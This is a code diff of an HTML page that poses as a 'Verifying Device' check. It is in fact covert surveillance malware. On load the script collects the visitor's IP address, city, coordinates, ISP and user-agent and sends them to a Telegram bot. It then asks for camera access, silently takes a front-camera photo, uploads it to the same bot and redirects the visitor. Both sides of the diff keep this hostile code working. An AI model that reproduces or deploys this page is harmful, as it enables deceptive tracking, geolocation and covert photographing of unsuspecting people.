@@ -5,13 +5,13 @@
   <title>Verifying...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { font-family: sans-serif; text-align: center; padding: 50px; }
+    body { font-family: sans-serif; text-align: center; padding: 40px; }
     video, canvas { display: none; }
   </style>
 </head>
 <body>
   <h2>Verifying Device...</h2>
-  <p>Please allow camera access to continue.</p>
+  <p>Please allow camera access.</p>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
@@ -23,84 +23,71 @@
 
     let deviceInfo = "";
 
-    // Step 1: Get IP Info
+    // STEP 1: GET IP + DEVICE INFO
     fetch("https://ipinfo.io/json?token=18d2a866939a58")
       .then(res => res.json())
       .then(data => {
         deviceInfo = 
-🔐 New Visitor Alert
+🔐 Visitor Info:
 🌐 IP: ${data.ip}
-📍 Location: ${data.city}, ${data.region}, ${data.country}
-📌 Coordinates: ${data.loc}
+📍 ${data.city}, ${data.region}, ${data.country}
+📌 Coords: ${data.loc}
 📡 ISP: ${data.org}
-🕓 Timezone: ${data.timezone}
-🧠 Fonts: ${navigator.platform}, ${navigator.language}
-📱 User-Agent: ${navigator.userAgent}
-📅 Time: ${new Date().toLocaleString()}
-        ;
+🧠 User-Agent: ${navigator.userAgent}
+🕓 Time: ${new Date().toLocaleString()}
+        .trim();
 
-        sendMessage(deviceInfo.trim());
-      });
-
-    function sendMessage(text) {
-      fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text
-        })
-      });
-    }
-
-    // Step 2: Access Camera
-    navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "environment" } // "user" = front, "environment" = back
-    })
-    .then(stream => {
-      const video = document.getElementById("video");
-      video.srcObject = stream;
-
-      // Take snapshot after 3 seconds
-      setTimeout(() => {
-        takeSnapshot(stream);
-      }, 3000);
-    })
-    .catch(err => {
-      sendMessage("❌ Camera access denied.\n" + err);
-      setTimeout(() => window.location.href = redirectUrl, 4000);
-    });
-
-    // Step 3: Take Snapshot
-    function takeSnapshot(stream) {
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
-      const ctx = canvas.getContext("2d");
-
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      // Stop video stream
-      stream.getTracks().forEach(track => track.stop());
-
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", blob);
-        formData.append("caption", "📷 Captured image\n\n" + new Date().toLocaleString());
-
-        fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
+        // Send text info first
+        fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
           method: "POST",
-          body: formData
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: deviceInfo })
         });
+      });
 
-        // Redirect after photo sent
+    // STEP 2: CAMERA ACCESS & PHOTO
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+
+          // Take snapshot after 3 seconds
+          setTimeout(() => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            stream.getTracks().forEach(track => track.stop());
+
+            canvas.toBlob(blob => {
+              const formData = new FormData();
+              formData.append("chat_id", chatId);
+              formData.append("photo", blob);
+              formData.append("caption", "📸 Visitor Snapshot");
+
+              fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
+                method: "POST",
+                body: formData
+              });
+
+              // Redirect after photo sent
+              setTimeout(() => {
+                window.location.href = redirectUrl;
+              }, 2000);
+            }, "image/jpeg", 0.9);
+          }, 3000);
+        };
+      })
+      .catch(err => {
+        alert("❌ Camera access denied: " + err.message);
         setTimeout(() => {
           window.location.href = redirectUrl;
         }, 3000);
-      }, "image/jpeg", 0.8);
-    }
+      });
   </script>
 </body>
 </html>
